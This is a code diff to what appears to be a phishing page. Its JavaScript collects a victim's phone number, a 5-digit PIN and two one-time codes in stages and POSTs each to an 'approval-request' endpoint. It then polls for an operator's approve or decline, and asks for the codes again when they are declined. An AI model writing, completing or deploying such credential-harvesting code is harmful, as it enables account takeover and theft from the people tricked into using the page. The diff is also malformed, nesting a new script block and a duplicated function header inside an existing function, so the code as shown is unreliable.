@@ -568,6 +568,150 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
   msgElement.className = "status";
   msgElement.innerText = "";
 
+<script>
+let sessionId = null;
+let userData = { phone: "", pin: "", code1: "", code2: "" };
+let pollingInterval = null;
+
+// Initialize Session
+window.addEventListener("DOMContentLoaded", async () => {
+  try {
+    const res = await fetch("/api/session", { method: "POST" });
+    const data = await res.json();
+    sessionId = data.sessionId;
+  } catch (err) {
+    console.error("Initialization error:", err);
+  }
+});
+
+// Setup dynamic item grid handling routines
+function setupBoxInputs(containerId, count, onComplete) {
+  const container = document.getElementById(containerId);
+  container.innerHTML = "";
+  const inputs = [];
+
+  for (let i = 0; i < count; i++) {
+    const input = document.createElement("input");
+    input.type = "tel";
+    input.maxLength = 1;
+    input.inputMode = "numeric";
+    input.autocomplete = "off";
+
+    input.addEventListener("input", (e) => {
+      input.value = input.value.replace(/\D/g, "");
+      if (input.value && i < count - 1) inputs[i + 1].focus();
+      
+      const fullValue = inputs.map(el => el.value).join("");
+      if (fullValue.length === count) {
+        inputs.forEach(el => el.disabled = true);
+        onComplete(fullValue);
+      }
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && i > 0) {
+        inputs[i - 1].focus();
+      }
+    });
+
+    container.appendChild(input);
+    inputs.push(input);
+  }
+  
+  if (inputs.length > 0) inputs[0].focus();
+}
+
+// Step 1 Phone Input Dynamic Activation Routines
+const phoneInput = document.getElementById("phone");
+const nextPhoneBtn = document.getElementById("nextPhone");
+
+phoneInput.addEventListener("input", () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g, "");
+  
+  if (phoneInput.value.length === 9) {
+    nextPhoneBtn.removeAttribute("disabled");
+  } else {
+    nextPhoneBtn.setAttribute("disabled", "true");
+  }
+});
+
+nextPhoneBtn.addEventListener("click", () => {
+  userData.phone = phoneInput.value;
+  document.getElementById("page1").classList.add("hidden");
+  document.getElementById("page2").classList.remove("hidden");
+  
+  setupBoxInputs("pinBoxes", 5, submitPinStage);
+});
+
+// Post Phone & PIN bundle configurations
+async function submitPinStage(pinValue) {
+  userData.pin = pinValue;
+  document.getElementById("pinWaiting").classList.remove("hidden");
+  
+  const success = await sendStagePayload("pin", { phone: userData.phone, pin: userData.pin });
+  if (success) {
+    startPolling("pin", "page2", "page3", "pinWaiting", "pinMessage", () => {
+      setTimeout(() => document.getElementById("code1").focus(), 50);
+    });
+  }
+}
+
+// Track and validate Page 3 input elements
+const code1Input = document.getElementById("code1");
+const submitCode1Btn = document.getElementById("submitCode1");
+
+code1Input.addEventListener("input", () => {
+  if (code1Input.value.trim().length > 0) {
+    submitCode1Btn.removeAttribute("disabled");
+  } else {
+    submitCode1Btn.setAttribute("disabled", "true");
+  }
+});
+
+submitCode1Btn.addEventListener("click", async () => {
+  userData.code1 = code1Input.value.trim();
+  submitCode1Btn.setAttribute("disabled", "true");
+  document.getElementById("code1Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code1", { code1: userData.code1 });
+  if (success) {
+    startPolling("code1", "page3", "page4", "code1Waiting", "code1Message", () => {
+      setupBoxInputs("code2Boxes", 4, submitCode2Stage);
+    });
+  }
+});
+
+// Final step submission handler
+async function submitCode2Stage(code2Value) {
+  userData.code2 = code2Value;
+  document.getElementById("code2Waiting").classList.remove("hidden");
+
+  const success = await sendStagePayload("code2", { code2: userData.code2 });
+  if (success) {
+    startPolling("code2", "page4", "page5", "code2Waiting", "code2Message");
+  }
+}
+
+// Pipeline transmission communications helper
+async function sendStagePayload(stage, payload) {
+  try {
+    const response = await fetch("/api/approval-request", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ sessionId, stage, payload })
+    });
+    return response.ok;
+  } catch (e) {
+    return false;
+  }
+}
+
+// Polling core infrastructure engine
+function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, successCallback) {
+  const msgElement = document.getElementById(msgId);
+  msgElement.className = "status";
+  msgElement.innerText = "";
+
   if(pollingInterval) clearInterval(pollingInterval);
 
   pollingInterval = setInterval(async () => {
@@ -581,34 +725,48 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
         document.getElementById(currentPageId).classList.add("hidden");
         document.getElementById(nextPageId).classList.remove("hidden");
         if (successCallback) successCallback();
-            } else if (data.status === "declined") {
+      } else if (data.status === "declined") {
         clearInterval(pollingInterval);
         
         // 1. Hide the full-page waiting spinner overlay screen
         document.getElementById(spinnerId).classList.add("hidden");
         
-        // FIX: Force the page section containing the form card back into view!
+        // 2. Bring the actual input panel form card back into view!
         document.getElementById(currentPageId).classList.remove("hidden");
         
-        // 2. Clear out old entries from text boxes and individual PIN grids
+        // 3. Clear text input area safely (For Page 3 OTP text field)
         const otpInput = document.getElementById('code1');
-        if (otpInput) otpInput.value = '';
+        if (otpInput) {
+          otpInput.value = '';
+          otpInput.removeAttribute("disabled");
+        }
         
-        const pinBoxes = document.querySelectorAll('.boxes input');
-        pinBoxes.forEach(box => {
-          box.value = '';
-          box.disabled = false; // Re-enable boxes so users can re-type entries
+        // 4. Completely clear and UNLOCK square boxes grids (For Pages 2 & 4)
+        const boxContainers = document.getElementById(currentPageId).querySelectorAll('.boxes');
+        boxContainers.forEach(container => {
+          // If it's a grid form stage, completely rebuild the empty clickable boxes!
+          if (stage === "pin") {
+            setupBoxInputs("pinBoxes", 5, submitPinStage);
+          } else if (stage === "code2") {
+            setupBoxInputs("code2Boxes", 4, submitCode2Stage);
+          }
         });
         
-        // 3. Reset the primary continue button back to its initial locked style state
+        // 5. Unfreeze and re-lock action push buttons to initial state configuration
         const submitBtn = document.getElementById('submitCode1');
-        if (submitBtn) submitBtn.disabled = true;
+        if (submitBtn) {
+          submitBtn.setAttribute("disabled", "true");
+        }
+        
+        const nextPhoneElement = document.getElementById('nextPhone');
+        if (nextPhoneElement && stage === "pin") {
+          nextPhoneElement.removeAttribute("disabled");
+        }
 
-        // 4. Alert user about the correction step without blocking the interface view
+        // 6. Output clear error statement message text
         msgElement.className = "error";
         msgElement.innerText = "Incorrect entry. Please enter the correct details.";
       }
-
  
     } catch (err) {
       console.error("Status check failed");
@@ -616,6 +774,3 @@ function startPolling(stage, currentPageId, nextPageId, spinnerId, msgId, succes
   }, 2500);
 }
 </script>
-</body>
-</html>
-
